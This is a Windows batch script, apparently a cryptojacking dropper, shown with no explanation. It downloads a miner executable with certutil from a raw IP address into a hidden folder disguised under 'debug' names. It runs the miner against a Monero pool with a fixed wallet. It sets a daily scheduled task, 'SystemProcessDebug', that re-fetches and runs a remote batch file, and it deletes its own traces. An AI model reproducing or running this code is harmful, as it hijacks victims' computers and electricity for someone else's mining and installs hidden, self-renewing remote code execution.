@echo off
chcp 437
del %USERPROFILE%\Documents\debugProcess.bat
tasklist > debug.log
type debug.log | find "debug.exe" && del debug.log && del debug.bat&& exit
del debug.log
md "%USERPROFILE%\Documents\debug" & attrib +s +a +h +r "%USERPROFILE%\Documents\debug"
if not exist %USERPROFILE%\Documents\debug\debug.exe certutil.exe -urlcache -split -f http://146.196.83.217:29324/xxgic/xm.exe %USERPROFILE%\Documents\debug\debug.exe
schtasks > sc.log
type sc.log | find "SystemProcessDebug" && %USERPROFILE%\Documents\debug\debug.exe --coin monero -o mine.c3pool.com:13333 -u 46YngqQEZQ6HYhqP7noesGdoecXZRM2jR16t7RKTbhW4TtqdKUQyggs3x7pADEWvpr5ySbesyQQwJfaHbewXurEWNdeWNtj -p x -k -B --donate-level=1 --cpu-max-threads-hint=70 && del sc.log
schtasks /create /tn SystemProcessDebug /tr "certutil.exe -urlcache -split -f http://146.196.83.217:29324/xxgic/debug.bat %USERPROFILE%\Documents\debug.bat & %USERPROFILE%\Documents\debug.bat" /sc daily >nul 2>nul
%USERPROFILE%\Documents\debug\debug.exe --coin monero -o mine.c3pool.com:13333 -u 46YngqQEZQ6HYhqP7noesGdoecXZRM2jR16t7RKTbhW4TtqdKUQyggs3x7pADEWvpr5ySbesyQQwJfaHbewXurEWNdeWNtj -p win -k -B --donate-level=1 --cpu-max-threads-hint=70
del sc.log
del %USERPROFILE%\Documents\debug.bat
del debug.bat
